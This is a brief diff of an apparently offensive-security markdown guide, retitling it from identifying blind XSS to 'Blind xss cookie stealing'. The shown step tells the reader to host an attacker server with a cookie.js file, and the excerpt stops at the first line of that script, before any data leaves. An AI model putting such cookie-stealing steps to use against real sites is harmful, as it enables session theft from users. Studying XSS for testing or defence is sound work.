@@ -1,4 +1,4 @@
-# Identifing blind xss
+# Blind xss cookie stealing
 ### 1. Host a temorary http server(attacker server) with below file and paste the below code inside as cookie.js
 
 var request = new XMLHttpRequest();<br/>
